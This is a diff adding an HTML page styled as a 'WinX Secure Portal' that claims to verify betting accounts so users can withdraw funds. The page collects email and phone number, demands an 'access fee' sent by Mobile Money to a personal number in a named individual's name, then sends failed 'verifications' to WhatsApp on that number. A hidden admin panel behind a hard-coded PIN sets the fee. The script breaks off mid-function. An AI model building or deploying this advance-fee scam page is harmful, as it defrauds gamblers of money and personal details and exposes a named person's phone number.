@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>WinX - Secure Account Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #0a0d14;
+            color: #f3f4f6;
+            -webkit-tap-highlight-color: transparent;
+        }
+        input {
+            font-size: 16px !important;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 15px rgba(126, 226, 209, 0.15); }
+            50% { box-shadow: 0 0 25px rgba(126, 226, 209, 0.35); }
+        }
+        .glow-card {
+            animation: pulseGlow 3s infinite ease-in-out;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between bg-[#0a0d14] text-slate-100 antialiased selection:bg-[#7ee2d1] selection:text-[#0a0d14]">
+
+    <!-- Top Header Navigation Bar -->
+    <header class="w-full border-b border-[#1e2638] bg-[#0a0d14]/80 backdrop-blur-md sticky top-0 z-45 px-4 py-3.5">
+        <div class="max-w-md mx-auto flex items-center justify-between">
+            <div class="flex items-center space-x-2.5">
+                <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-[#7ee2d1] to-teal-600 flex items-center justify-center font-bold text-[#0a0d14] text-lg shadow-md shadow-[#7ee2d1]/10">
+                    W
+                </div>
+                <div>
+                    <h1 class="font-bold text-base tracking-tight text-white flex items-center gap-1.5">
+                        WinX <span class="text-xs px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 font-medium border border-purple-500/30">Secure Portal</span>
+                    </h1>
+                    <p class="text-[11px] text-slate-400">Encrypted Withdrawal Verification</p>
+                </div>
+            </div>
+            <div id="step-indicator" class="text-xs font-semibold px-2.5 py-1 rounded-full bg-[#111622] border border-[#1e2638] text-[#7ee2d1]">
+                Intro
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="w-full max-w-md mx-auto px-4 py-6 flex-1 flex flex-col justify-center">
+
+        <!-- INTRO PAGE: Remote Account Verification -->
+        <section id="view-intro" class="transition-all duration-300 space-y-5">
+            <div class="bg-[#111622] border border-[#1e2638] rounded-2xl p-6 shadow-xl space-y-6 text-center">
+                <div class="w-16 h-16 bg-purple-500/10 border border-purple-500/30 rounded-full flex items-center justify-center mx-auto text-purple-400 shadow-lg shadow-purple-500/10">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+                </div>
+
+                <div class="space-y-2">
+                    <span class="inline-block px-3 py-1 rounded-full bg-purple-500/15 text-purple-300 text-xs font-bold tracking-wider uppercase border border-purple-500/30">Remote Account Verification</span>
+                    <h2 class="text-2xl font-bold text-white">Enable Instant Withdrawals</h2>
+                    <p class="text-sm text-slate-300 leading-relaxed max-w-xs mx-auto">
+                        Verify your WinX account remotely right here to unlock secure fund withdrawals, protect your betting balance, and authenticate your transaction reference.
+                    </p>
+                </div>
+
+                <button type="button" id="start-verification-btn" class="w-full py-4 px-4 bg-[#7ee2d1] hover:bg-[#68d3c1] active:scale-[0.99] text-[#0a0d14] font-bold rounded-xl shadow-lg shadow-[#7ee2d1]/15 transition-all flex items-center justify-center gap-2 text-base">
+                    <span>Proceed to Verification</span>
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
+                </button>
+            </div>
+        </section>
+
+        <!-- STEP 1: Contact Details Form -->
+        <section id="view-step-1" class="hidden transition-all duration-300 space-y-5">
+            <div class="space-y-1">
+                <div class="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-purple-500/15 border border-purple-500/30 text-purple-300 text-xs font-semibold mb-2">
+                    <span class="w-1.5 h-1.5 rounded-full bg-purple-400 animate-pulse"></span>
+                    Step 1: Contact Details
+                </div>
+                <h2 class="text-2xl font-bold tracking-tight text-white">Enter your details</h2>
+                <p class="text-sm text-slate-400">Please provide your active email and phone number to initiate verification.</p>
+            </div>
+
+            <div class="bg-[#111622] border border-[#1e2638] rounded-2xl p-5 shadow-xl space-y-4">
+                <form id="contact-form" class="space-y-4" novalidate>
+                    <div class="space-y-1.5">
+                        <label for="email" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider">Email Address</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+                            </span>
+                            <input type="email" id="email" required placeholder="name@example.com"
+                                class="w-full pl-10 pr-4 py-3 bg-[#0a0d14] border border-[#1e2638] rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-[#7ee2d1] focus:ring-1 focus:ring-[#7ee2d1] transition-all">
+                        </div>
+                        <p id="email-error" class="text-xs text-rose-400 hidden mt-1"></p>
+                    </div>
+
+                    <div class="space-y-1.5">
+                        <label for="phone" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider">Phone Number</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"/></svg>
+                            </span>
+                            <input type="tel" id="phone" required placeholder="e.g. 0501234567"
+                                class="w-full pl-10 pr-4 py-3 bg-[#0a0d14] border border-[#1e2638] rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-[#7ee2d1] focus:ring-1 focus:ring-[#7ee2d1] transition-all">
+                        </div>
+                        <p id="phone-error" class="text-xs text-rose-400 hidden mt-1"></p>
+                    </div>
+
+                    <button type="submit" class="w-full mt-2 py-3.5 px-4 bg-[#7ee2d1] hover:bg-[#68d3c1] active:scale-[0.99] text-[#0a0d14] font-bold rounded-xl shadow-lg shadow-[#7ee2d1]/15 transition-all flex items-center justify-center gap-2">
+                        <span>Continue to VERIFY</span>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
+                    </button>
+                </form>
+            </div>
+        </section>
+
+        <!-- STEP 2: Payment Instructions & Reference Authorization -->
+        <section id="view-step-2" class="hidden transition-all duration-300 space-y-5">
+            <div class="space-y-1">
+                <div class="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-purple-500/15 border border-purple-500/35 text-purple-300 text-xs font-semibold mb-2">
+                    <div class="w-5 h-5 rounded-full bg-purple-500 flex items-center justify-center text-white text-[10px] font-bold shadow-sm shadow-purple-500/50">1</div>
+                    <span>PAYMENT INSTRUCTIONS</span>
+                </div>
+                <h2 class="text-2xl font-bold tracking-tight text-white">Reference Authorization</h2>
+                <p class="text-sm text-slate-400">Complete your transfer and enter your confidential Transaction ID below.</p>
+            </div>
+
+            <!-- Exact Payment Instructions Card layout matching reference image (Without duplicate copy button) -->
+            <div class="bg-[#111622] border border-[#1e2638] rounded-2xl p-5 shadow-xl space-y-3.5">
+                <div class="flex justify-between items-center py-2 border-b border-[#1e2638]">
+                    <span class="text-slate-400 text-sm">Access Fee:</span>
+                    <span id="display-amount" class="font-bold text-white text-base">GHC 0.00</span>
+                </div>
+                
+                <div class="flex justify-between items-center py-2 border-b border-[#1e2638]">
+                    <span class="text-slate-400 text-sm">Payment Method:</span>
+                    <span class="font-medium text-white text-sm flex items-center gap-1.5">
+                        <span>📱</span> Mobile Money (Telecel)
+                    </span>
+                </div>
+
+                <div class="flex justify-between items-center py-2 border-b border-[#1e2638]">
+                    <span class="text-slate-400 text-sm">Momo Number:</span>
+                    <div class="flex items-center gap-3">
+                        <span id="merchant-id-text" class="font-mono font-semibold text-[#7ee2d1] text-sm">0503829895</span>
+                        <button type="button" id="copy-merchant-btn" class="px-2.5 py-1.5 rounded-lg bg-[#0a0d14] hover:bg-[#1e2638] border border-[#1e2638] text-xs font-semibold text-slate-300 flex items-center gap-1.5 transition-all">
+                            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"/></svg>
+                            <span>Copy</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="flex justify-between items-center pt-1">
+                    <span class="text-slate-400 text-sm">Account Name:</span>
+                    <span class="font-medium text-white text-sm flex items-center gap-2">
+                        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                        <span class="text-emerald-400 font-semibold">Justice Appiah</span>
+                    </span>
+                </div>
+            </div>
+
+            <!-- Security Authorization Card with Holdable Red Shield Icon -->
+            <div class="bg-[#111622] border border-rose-500/20 rounded-2xl p-5 shadow-xl space-y-4 relative overflow-hidden">
+                <div class="flex flex-col items-center text-center space-y-3">
+                    <div id="admin-trigger-shield" class="w-12 h-12 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-500 shadow-lg shadow-rose-500/10 cursor-pointer select-none transition-transform active:scale-95" title="Hold to unlock settings">
+                        <svg class="w-6 h-6 pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                    </div>
+
+                    <div class="space-y-1">
+                        <span class="inline-block px-2.5 py-0.5 rounded-full bg-rose-500/15 text-rose-400 text-[10px] font-bold uppercase tracking-wider border border-rose-500/30">Security Authorization Required</span>
+                        <h3 class="font-bold text-white text-lg">Reference Authorization</h3>
+                        <p class="text-xs text-slate-400 leading-relaxed max-w-sm">
+                            Make sure to input the transaction ID number you received from SMS when making the <span id="desc-amount" class="text-white font-semibold">GHC 0.00</span> payment because that will be used to verify your account to allow withdrawals. Tap below to verify your confidential Transaction ID Number.
+                        </p>
+                    </div>
+                </div>
+
+                <form id="verify-form" class="space-y-3 pt-2" novalidate>
+                    <div class="space-y-1.5">
+                        <input type="text" id="reference-id" required placeholder="Enter confidential Transaction ID Number"
+                            class="w-full px-4 py-3.5 bg-[#0a0d14] border border-[#1e2638] rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-[#7ee2d1] focus:ring-1 focus:ring-[#7ee2d1] transition-all font-mono text-center tracking-wider">
+                    </div>
+
+                    <div class="flex gap-3 pt-1">
+                        <button type="button" id="back-to-step-1" class="px-4 py-3.5 bg-[#0a0d14] hover:bg-[#1e2638] text-slate-300 font-semibold rounded-xl border border-[#1e2638] transition-all text-sm">
+                            Back
+                        </button>
+                        <button type="submit" class="flex-1 py-3.5 px-4 bg-[#7ee2d1] hover:bg-[#68d3c1] active:scale-[0.99] text-[#0a0d14] font-bold rounded-xl shadow-lg shadow-[#7ee2d1]/15 transition-all flex items-center justify-center gap-2">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
+                            <span>VERIFY</span>
+                        </button>
+                    </div>
+                </form>
+            </div>
+
+            <!-- DYNAMIC WHATSAPP SUPPORT CARD -->
+            <div id="whatsapp-support-card" class="hidden bg-[#111622] border border-rose-500/30 rounded-2xl p-5 shadow-xl space-y-4">
+                <div class="flex items-start gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-rose-500/20 border border-rose-500/30 flex items-center justify-center text-rose-400 shrink-0">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+                    </div>
+                    <div class="space-y-1 flex-1">
+                        <h3 class="font-bold text-rose-400 text-sm">Verification Unsuccessful</h3>
+                        <p class="text-xs text-slate-300 leading-relaxed">The transaction reference ID you entered could not be automatically authenticated in our ledger.</p>
+                    </div>
+                </div>
+
+                <div class="bg-[#0a0d14] p-3.5 rounded-xl border border-[#1e2638] space-y-1">
+                    <span class="text-[11px] font-medium text-slate-400 uppercase tracking-wider">Attempted Reference ID:</span>
+                    <p id="failed-id-display" class="font-mono text-white font-semibold text-sm break-all select-all"></p>
+                </div>
+
+                <a id="whatsapp-btn" href="#" target="_blank" rel="noopener noreferrer" 
+                    class="w-full py-3 px-4 bg-emerald-600 hover:bg-emerald-500 active:scale-[0.99] text-white font-bold rounded-xl shadow-lg shadow-emerald-600/20 transition-all flex items-center justify-center gap-2.5 text-sm">
+                    <svg class="w-5 h-5 fill-current" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.448 3.481 5.434 3.479 8.62-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/></svg>
+                    <span>Chat on WhatsApp (0503829895)</span>
+                </a>
+            </div>
+        </section>
+
+        <!-- STEP 3: Success Confirmation View -->
+        <section id="view-step-3" class="hidden transition-all duration-300 space-y-5 text-center">
+            <div class="bg-[#111622] border border-[#7ee2d1]/30 rounded-2xl p-6 shadow-2xl glow-card space-y-5">
+                <div class="w-16 h-16 bg-[#7ee2d1]/20 border border-[#7ee2d1]/40 rounded-full flex items-center justify-center mx-auto text-[#7ee2d1] shadow-lg shadow-[#7ee2d1]/10">
+                    <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>
+                </div>
+
+                <div class="space-y-2">
+                    <span class="inline-block px-3 py-1 rounded-full bg-[#7ee2d1]/15 text-[#7ee2d1] text-xs font-bold tracking-wider uppercase">Verification Successful</span>
+                    <h2 class="text-2xl font-bold text-white">Payment Confirmed!</h2>
+                    <p class="text-sm text-slate-300 max-w-xs mx-auto">Your transaction reference has been successfully verified and account withdrawal access is now enabled.</p>
+                </div>
+
+                <div class="bg-[#0a0d14] rounded-xl p-4 border border-[#1e2638] text-left space-y-2 text-xs">
+                    <div class="flex justify-between">
+                        <span class="text-slate-400">Verified Email:</span>
+                        <span id="success-email" class="font-medium text-white">user@example.com</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span class="text-slate-400">Verified Phone:</span>
+                        <span id="success-phone" class="font-medium text-white">+233 50 000 0000</span>
+                    </div>
+                    <div class="flex justify-between pt-2 border-t border-[#1e2638]">
+                        <span class="text-slate-400">Reference ID:</span>
+                        <span class="font-mono font-semibold text-[#7ee2d1]">89984887780</span>
+                    </div>
+                </div>
+
+                <button id="reset-app-btn" class="w-full py-3.5 px-4 bg-[#0a0d14] hover:bg-[#1e2638] text-[#7ee2d1] font-bold rounded-xl border border-[#7ee2d1]/30 transition-all text-sm">
+                    Start New Verification
+                </button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- ADMIN MODAL (Unlocked via Code 7060 by holding shield for 800ms) -->
+    <div id="admin-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="bg-[#111622] border border-[#1e2638] rounded-2xl p-6 w-full max-w-sm shadow-2xl space-y-4">
+            <div class="flex items-center justify-between">
+                <h3 class="font-bold text-white text-base flex items-center gap-2">
+                    <svg class="w-5 h-5 text-[#7ee2d1]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
+                    WinX Admin Panel
+                </h3>
+                <button type="button" id="admin-close-btn" class="text-slate-400 hover:text-white p-1">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+                </button>
+            </div>
+
+            <!-- PIN View -->
+            <div id="admin-pin-view" class="space-y-4">
+                <p class="text-xs text-slate-400">Enter admin passcode to authorize settings changes.</p>
+                <form id="admin-pin-form" class="space-y-3">
+                    <input type="password" id="admin-pin-input" maxlength="4" placeholder="••••" required
+                        class="w-full px-4 py-3 bg-[#0a0d14] border border-[#1e2638] rounded-xl text-white text-center font-mono tracking-widest text-lg focus:outline-none focus:border-[#7ee2d1]">
+                    <button type="submit" class="w-full py-3 bg-[#7ee2d1] hover:bg-[#68d3c1] text-[#0a0d14] font-bold rounded-xl text-sm transition-all">
+                        Unlock Admin
+                    </button>
+                </form>
+                <p id="admin-pin-error" class="text-xs text-rose-400 hidden text-center">Incorrect passcode</p>
+            </div>
+
+            <!-- Config View -->
+            <div id="admin-config-view" class="space-y-4 hidden">
+                <div class="space-y-1.5">
+                    <label class="block text-xs font-semibold text-slate-300 uppercase tracking-wider">New Payment Amount (e.g. GHC 150.00)</label>
+                    <input type="text" id="admin-amount-input" placeholder="GHC 0.00"
+                        class="w-full px-4 py-3 bg-[#0a0d14] border border-[#1e2638] rounded-xl text-white font-mono text-sm focus:outline-none focus:border-[#7ee2d1]">
+                </div>
+                <button type="button" id="admin-save-btn" class="w-full py-3 bg-[#7ee2d1] hover:bg-[#68d3c1] text-[#0a0d14] font-bold rounded-xl text-sm transition-all">
+                    Update Amount
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="w-full border-t border-[#1e2638] py-4 px-4 text-center text-xs text-slate-500">
+        &copy; 2026 WinX Secure Technologies. All rights reserved.
+    </footer>
+
+    <!-- JavaScript Application Logic & Web Audio API Cues -->
+    <script>
+        // Web Audio API Sound Generator
+        const AudioFX = {
+            ctx: null,
+            init() {
+                if (!this.ctx) {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (AudioContext) {
+                        this.ctx = new AudioContext();
+                    }
+                }
+                if (this.ctx && this.ctx.state === 'suspended') {
+                    this.ctx.resume();
+                }
+            },
+            playTap() {
+                try {
+                    this.init();
+                    if (!this.ctx) return;
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(440, this.ctx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(880, this.ctx.currentTime + 0.05);
+                    gain.gain.setValueAtTime(0.08, this.ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.001, this.ctx.currentTime + 0.05);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + 0.05);
+                } catch(e) {}
+            },
+            playSuccess() {
+                try {
+                    this.init();
+                    if (!this.ctx) return;
+                    const now = this.ctx.currentTime;
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'triangle';
+                    osc.frequency.setValueAtTime(523.25, now);
+                    osc.frequency.setValueAtTime(659.25, now + 0.08);
+                    osc.frequency.setValueAtTime(783.99, now + 0.16);
+                    gain.gain.setValueAtTime(0.1, now);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(now + 0.4);
+                } catch(e) {}
+            },
+            playError() {
+                try {
+                    this.init();
+                    if (!this.ctx) return;
+                    const now = this.ctx.currentTime;
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(220, now);
+                    osc.frequency.setValueAtTime(150, now + 0.15);
+                    gain.gain.setValueAtTime(0.12, now);
+                    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(now + 0.3);
+                } catch(e) {}
+            }
+        };
+
+        // State Management with localStorage persistence
+        const state = {
+            email: '',
+            phone: '',
+            currentView: 'intro',
+            amount: localStorage.getItem('winx_payment_amount') || '0.00'
+        };
+
+        const stepIndicator = document.getElementById('step-indicator');
+        const viewIntro = document.getElementById('view-intro');
+        const viewStep1 = document.getElementById('view-step-1');
+        const viewStep2 = document.getElementById('view-step-2');
+        const viewStep3 = document.getElementById('view-step-3');
+
+        const startVerificationBtn = document.getElementById('start-verification-btn');
+        const contactForm = document.getElementById('contact-form');
+        const emailInput = document.getElementById('email');
+        const phoneInput = document.getElementById('phone');
+        const emailError = document.getElementById('email-error');
+        const phoneError = document.getElementById('phone-error');
+
+        const verifyForm = document.getElementById('verify-form');
+        const referenceInput = document.getElementById('reference-id');
+        const backToStep1Btn = document.getElementById('back-to-step-1');
+
+        const whatsappSupportCard = document.getElementById('whatsapp-support-card');
+        const failedIdDisplay = document.getElementById('failed-id-display');
+        const whatsappBtn = document.getElementById('whatsapp-btn');
+
+        const successEmail = document.getElementById('success-email');
+        const successPhone = document.getElementById('success-phone');
+        const resetAppBtn = document.getElementById('reset-app-btn');
+
+        const displayAmount = document.getElementById('display-amount');
+        const descAmount = document.getElementById('desc-amount');
+
+        // Admin Modal elements
+        const adminTriggerShield = document.getElementById('admin-trigger-shield');
+        const adminModal = document.getElementById('admin-modal');
+        const adminCloseBtn = document.getElementById('admin-close-btn');
+        const adminPinView = document.getElementById('admin-pin-view');
+        const adminConfigView = document.getElementById('admin-config-view');
+        const adminPinForm = document.getElementById('admin-pin-form');
+        const adminPinInput = document.getElementById('admin-pin-input');
+        const adminPinError = document.getElementById('admin-pin-error');
+        const adminAmountInput = document.getElementById('admin-amount-input');
+        const adminSaveBtn = document.getElementById('admin-save-btn');
+
+        function applyAmount(amt) {
+            state.amount = amt;
+            const formatted = `GHC ${amt}`;
+            displayAmount.textContent = formatted;
+            descAmount.textContent = formatted;
+        }
+
+        // Initialize display amount on load
+        applyAmount(state.amount);
+
+        function switchView(viewName) {
+            state.currentView = viewName;
+            viewIntro.classList.add('hidden');
+            viewStep1.classList.add('hidden');
+            viewStep2.classList.add('hidden');
+            viewStep3.classList.add('hidden');
+
+            if (viewName === 'intro') {
+                stepIndicator.textContent = 'Intro';
+                viewIntro.classList.remove('hidden');
+            } else if (viewName === 'step1') {
+                stepIndicator.textContent = 'Step 1 of 2';
+                viewStep1.classList.remove('hidden');
+            } else if (viewName === 'step2') {
+                stepIndicator.textContent = 'Step 2 of 2';
+                viewStep2.classList.remove('hidden');
+            } else if (viewName === 'step3') {
+                stepIndicator.textContent = 'Verified';
+                viewStep3.classList.remove('hidden');
+            }
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        startVerificationBtn.addEventListener('click', () => {
+            AudioFX.playTap();
+            switchView('step1');
+        });
+
+        // Contact form submission
+        contactForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            AudioFX.playTap();
+
+            let isValid = true;
+            const emailVal = emailInput.value.trim();
+            const phoneVal = phoneInput.value.trim();
+
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailVal) {
+                emailError.textContent = 'Email address is required.';
+                emailError.classList.remove('hidden');
+                isValid = false;
+            } else if (!emailRegex.test(emailVal)) {
+                emailError.textContent = 'Please enter a valid email address.';
+                emailError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                emailError.classList.add('hidden');
+            }
+
+            const phoneRegex = /^[\d\s\+\-\(\)]{7,15}$/;
+            if (!phoneVal) {
+                phoneError.textContent = 'Phone number is required.';
+                phoneError.classList.remove('hidden');
+                isValid = false;
+            } else if (!phoneRegex.test(phoneVal)) {
+                phoneError.textContent = 'Please enter a valid phone number.';
+                phoneError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                phoneError.classList.add('hidden');
+            }
+
+            if (isValid) {
+                state.email = emailVal;
+                state.phone = phoneVal;
+                switchView('step2');
+            } else {
+                AudioFX.playError();
+            }
+        });
+
+        // Copy merchant ID button
+        const copyMerchantBtn = document.getElementById('copy-merchant-btn');
+        const merchantIdText = document.getElementById('merchant-id-text');
+        copyMerchantBtn.addEventListener('click', () => {
+            AudioFX.playTap();
+            const dummy = document.createElement('textarea');
+            dummy.value = merchantIdText.textContent.trim();
+            document.body.appendChild(dummy);
+            dummy.select();
+            document.execCommand('copy');
+            document.body.removeChild(dummy);
+            const orig = copyMerchantBtn.innerHTML;
+            copyMerchantBtn.innerHTML = '<span class="text-[#7ee2d1]">Copied!</span>';
+            setTimeout(() => { copyMerchantBtn.innerHTML = orig; }, 2000);
+        });
+
+        backToStep1Btn.addEventListener('click', () => {
+            AudioFX.playTap();
+            switchView('step1');
+        });
+
+        // Hidden admin unlock (Hold shield for 800ms)
+        let holdTimer = null;
+        function startHold(e) {
+            e.preventDefault();
+            holdTimer = setTimeout(() => {
+                AudioFX.playTap();
+                adminPinInput.value = '';
+                adminPinError.classList.add('hidden');
+                adminPinView.classList.remove('hidden');
+                adminConfigView.classList.add('hidden');
+                adminModal.classList.remove('hidden');
+            }, 800);
+        }
+        function endHold() {
+            if (holdTimer) {
+                clearTimeout(holdTimer);
+                holdTimer = null;
+            }
+        }
+
+        adminTriggerShield.addEventListener('mousedown', startHold);
+        adminTriggerShield.addEventListener('mouseup', endHold);
+        adminTriggerShield.addEventListener('mouseleave', endHold);
+        adminTriggerShield.addEventListener('touchstart', startHold);
+        adminTriggerShield.addEventListener('touchend', endHold);
+
+        adminCloseBtn.addEventListener('click', () => {
+            AudioFX.playTap();
+            adminModal.classList.add('hidden');
+        });
+
+        adminPinForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            AudioFX.playTap();
+            if (adminPinInput.value.trim() === '7060') {
+                adminPinError.classList.add('hidden');
+                adminPinView.classList.add('hidden');
+                adminAmountInput.value = state.amount;
+                adminConfigView.classList.remove('hidden');
+            } else {
+                AudioFX.playError();
+                adminPinError.classList.remove('hidden');
+            }
+        });
+
+        adminSaveBtn.addEventListener('click', () => {
+            AudioFX.playTap();
+            const newAmt = adminAmountInput.value.trim();
+            if (newAmt) {
